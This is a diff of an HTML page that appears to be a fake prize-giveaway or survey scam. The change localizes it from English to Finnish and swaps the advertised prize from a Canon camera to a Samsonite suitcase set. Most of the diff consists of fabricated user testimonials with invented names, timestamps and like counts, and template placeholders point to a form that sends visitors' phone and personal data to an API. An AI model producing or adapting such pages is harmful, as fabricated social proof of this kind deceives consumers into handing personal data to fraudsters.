+                                                                           src="assets/fedbba216589a0a40fabb2e0cb24911e663e679e.webp" width="15px"
+                                                                           height="15px">6&nbsp;</span><small>&nbsp;·
+              <u style="margin-left:5px">4 minuuttia sitten</u></small></div>
           </div>
           <div class="comments" id="comment1" style="display:block">
             <div class="profile"><img src="assets/i-22.webp"></div>
             <div class="comment-content">
               <p class="name">Marvin Allen</p>
-              <p>I like these promotions!</p>
+              <p>Pidän näistä kampanjoista!</p>
             </div>
             <div class="clr"></div>
-            <div class="comment-status"><span>I like it · Comment <img style="margin-top:-7px"
-                                                                       src="assets/fedbba216589a0a40fabb2e0cb24911e663e679e.webp" width="15px"
-                                                                       height="15px">9</span><small>&nbsp;·
-              <u style="margin-left:5px">11 minutes ago</u></small></div>
+            <div class="comment-status"><span>Pidän siitä • Kommentti <img alt="" style="margin-top:-4px"
+                                                                           src="assets/fedbba216589a0a40fabb2e0cb24911e663e679e.webp" width="15px"
+                                                                           height="15px">6&nbsp;</span><small>&nbsp;·
+              <u style="margin-left:5px">11 minuuttia sitten</u></small></div>
           </div>
           <div class="comments" id="comment1" style="display:block">
             <div class="profile"><img src="assets/i-11.webp"></div>
             <div class="comment-content">
               <p class="name">Casey Daniels</p>
-              <p>I received my Canon today. Thanks a lot!</p>
+              <p>Sain Suitcase Set tänään. Kiitos paljon!</p>
             </div>
             <div class="clr"></div>
-            <div class="comment-status"><span>I like it · Comment <img style="margin-top:-7px"
-                                                                       src="assets/fedbba216589a0a40fabb2e0cb24911e663e679e.webp" width="15px"
-                                                                       height="15px">22</span><small>&nbsp;·
-              <u style="margin-left:5px">15 minutes ago</u></small></div>
+            <div class="comment-status"><span>Pidän siitä • Kommentti <img alt="" style="margin-top:-4px"
+                                                                           src="assets/fedbba216589a0a40fabb2e0cb24911e663e679e.webp" width="15px"
+                                                                           height="15px">6&nbsp;</span><small>&nbsp;·
+              <u style="margin-left:5px">15 minuuttia sitten</u></small></div>
           </div>
           <div class="comments" id="comment2" style="display:block">
             <div class="profile"><img src="assets/i-21.webp"></div>
             <div class="comment-content">
               <p class="name">Walter Hoffman</p>
-              <p>I thought it was a joke, but my camera arrived this morning!</p>
+              <p>Luulin sitä vitsiksi, mutta set saapui tänä aamuna!</p>
             </div>
             <div class="clr"></div>
-            <div class="comment-status"><span>I like it · Comment <img style="margin-top:-7px"
-                                                                       src="assets/fedbba216589a0a40fabb2e0cb24911e663e679e.webp" width="15px"
-                                                                       height="15px">36</span><small>&nbsp;·
-              <u style="margin-left:5px">38 minutes ago</u></small></div>
+            <div class="comment-status"><span>Pidän siitä • Kommentti <img alt="" style="margin-top:-4px"
+                                                                           src="assets/fedbba216589a0a40fabb2e0cb24911e663e679e.webp" width="15px"
+                                                                           height="15px">6&nbsp;</span><small>&nbsp;·
+              <u style="margin-left:5px">38 minuuttia sitten</u></small></div>
           </div>
           <div class="comments" id="comment3" style="display:block">
             <div class="profile"><img src="assets/15.webp"></div>
             <div class="comment-content">
               <p class="name">Florence Cleek</p>
-              <p>I participated, I won and I received my canon camera after 5 days. Thank you so much
-                guys!</p>
+              <p>Osallistuin, voitin ja sain Samsonite Suitcase Set 5 päivän kuluttua. Kiitos paljon, kaverit!</p>
             </div>
             <div class="clr"></div>
-            <div class="comment-status"><span>I like it · Comment <img style="margin-top:-7px"
-                                                                       src="assets/fedbba216589a0a40fabb2e0cb24911e663e679e.webp" width="15px"
-                                                                       height="15px">31</span><small>&nbsp;·
-              <u style="margin-left:5px">42 minutes ago</u></small></div>
+            <div class="comment-status"><span>Pidän siitä • Kommentti <img alt="" style="margin-top:-4px"
+                                                                           src="assets/fedbba216589a0a40fabb2e0cb24911e663e679e.webp" width="15px"
+                                                                           height="15px">6&nbsp;</span><small>&nbsp;·
+              <u style="margin-left:5px">42 minuuttia sitten</u></small></div>
           </div>
           <div class="comments" id="comment4" style="display:block">
             <div class="profile"><img src="assets/i-12.webp"></div>
             <div class="comment-content">
               <p class="name">Amalia Falchi</p>
-              <p>Can I receive my camera today? Thank you</p>
+              <p>Voinko saada set tänään? Kiitoksia.</p>
             </div>
             <div class="clr"></div>
-            <div class="comment-status"><span>I like it · Comment <img style="margin-top:-7px"
-                                                                       src="assets/fedbba216589a0a40fabb2e0cb24911e663e679e.webp" width="15px"
-                                                                       height="15px">6</span><small>&nbsp;·
-              <u style="margin-left:5px">1 hour ago</u></small></div>
+            <div class="comment-status"><span>Pidän siitä • Kommentti <img alt="" style="margin-top:-4px"
+                                                                           src="assets/fedbba216589a0a40fabb2e0cb24911e663e679e.webp" width="15px"
+                                                                           height="15px">6&nbsp;</span><small>&nbsp;·
+              <u style="margin-left:5px">1 tuntia sitten</u></small></div>
           </div>
           <div class="comments" id="comment5" style="display:block">
             <div class="profile"><img src="assets/i-16.webp"></div>
             <div class="comment-content">
               <p class="name">Margaret McNutt</p>
-              <p>I thought it was a joke but this morning I received my camera via DHL and would like
-                to
-                take more surveys!</p>
+              <p>I thought it was a joke but this morning I received my set via DHL and would like to take more
+                surveys!</p>
             </div>
             <div class="clr"></div>
-            <div class="comment-status"><span>I like it · Comment <img style="margin-top:-7px"
-                                                                       src="assets/fedbba216589a0a40fabb2e0cb24911e663e679e.webp" width="15px"
-                                                                       height="15px">15</span><small>&nbsp;·
-              <u style="margin-left:5px">2 hours ago</u></small></div>
+            <div class="comment-status"><span>Pidän siitä • Kommentti <img alt="" style="margin-top:-4px"
+                                                                           src="assets/fedbba216589a0a40fabb2e0cb24911e663e679e.webp" width="15px"
+                                                                           height="15px">6&nbsp;</span><small>&nbsp;·
+              <u style="margin-left:5px">2 tuntia sitten</u></small></div>
           </div>
           <div class="comments" id="comment5" style="display:block">
             <div class="profile"><img src="assets/i-23.webp"></div>
             <div class="comment-content">
               <p class="name">James Young</p>
-              <p>Are there any other surveys to take?</p>
+              <p>Onko muita tutkimuksia tehtävänä?</p>
             </div>
             <div class="clr"></div>
-            <div class="comment-status"><span>I like it · Comment <img style="margin-top:-7px"
-                                                                       src="assets/fedbba216589a0a40fabb2e0cb24911e663e679e.webp" width="15px"
-                                                                       height="15px">39</span><small>&nbsp;·
-              <u style="margin-left:5px">2 hours ago</u></small></div>
+            <div class="comment-status"><span>Pidän siitä • Kommentti <img alt="" style="margin-top:-4px"
+                                                                           src="assets/fedbba216589a0a40fabb2e0cb24911e663e679e.webp" width="15px"
+                                                                           height="15px">6&nbsp;</span><small>&nbsp;·
+              <u style="margin-left:5px">2 tuntia sitten</u></small></div>
           </div>
           <div class="comments" id="comment6" style="display:block">
             <div class="profile"><img src="assets/i-24.webp"></div>
             <div class="comment-content">
               <p class="name">Stephen Hall</p>
-              <p>Fantastic! I have never won anything before!</p>
+              <p>Fantastista! En ole koskaan ennen voittanut mitään!</p>
             </div>
             <div class="clr"></div>
-            <div class="comment-status"><span>I like it · Comment <img style="margin-top:-7px"
-                                                                       src="assets/fedbba216589a0a40fabb2e0cb24911e663e679e.webp" width="15px"
-                                                                       height="15px">23</span><small>&nbsp;·
-              <u style="margin-left:5px">3 hours ago</u></small></div>
+            <div class="comment-status"><span>Pidän siitä • Kommentti <img alt="" style="margin-top:-4px"
+                                                                           src="assets/fedbba216589a0a40fabb2e0cb24911e663e679e.webp" width="15px"
+                                                                           height="15px">6&nbsp;</span><small>&nbsp;·
+              <u style="margin-left:5px">3 tuntia sitten</u></small></div>
           </div>
           <div class="comments" id="comment7" style="display:block">
             <div class="profile"><img src="assets/i-13.webp"></div>
             <div class="comment-content">
               <p class="name">Tina Williams</p>
-              <p>At first I thought it was a joke but finally I got my Canon camera. I told friends
-                about
-                it, so they can get theirs too.</p>
+              <p>Aluksi luulin sitä vitsiksi, mutta lopulta sain Samsonite Suitcase Set. Kerroin siitä ystävilleni,
+                jotta
+                hekin voivat hankkia omansa.</p>
             </div>
             <div class="clr"></div>
-            <div class="comment-status"><span>I like it · Comment <img style="margin-top:-7px"
-                                                                       src="assets/fedbba216589a0a40fabb2e0cb24911e663e679e.webp" width="15px"
-                                                                       height="15px">30</span><small>&nbsp;·
-              <u style="margin-left:5px">4 hours ago</u></small></div>
+            <div class="comment-status"><span>Pidän siitä • Kommentti <img alt="" style="margin-top:-4px"
+                                                                           src="assets/fedbba216589a0a40fabb2e0cb24911e663e679e.webp" width="15px"
+                                                                           height="15px">6&nbsp;</span><small>&nbsp;·
+              <u style="margin-left:5px">4 tuntia sitten</u></small></div>
           </div>
         </div>
       </div>
     </div>
   </div>
+  <link rel="stylesheet" href="assets/index-form.css">
+  <link rel="stylesheet" href="assets/intlTelInput.min.css">
+  {snippet:p_min_js_snippet}
+  {snippet:slider_snippet}
+  {snippet:validate_form_snippet}
+  {snippet:set_country_snippet}
+  {snippet:api_form_send_v2}
 </div>
-<link rel="stylesheet" href="assets/index-form.css">
-<link rel="stylesheet" href="assets/intlTelInput.min.css">
-<link rel="stylesheet" href="assets/header.css">
-{snippet:p_min_js_snippet}
-{snippet:slider_snippet}
-{snippet:validate_form_snippet}
-{snippet:set_country_snippet}
-{snippet:api_form_send}
-{snippet:api_form_crm}
 </body>
 
 </html>
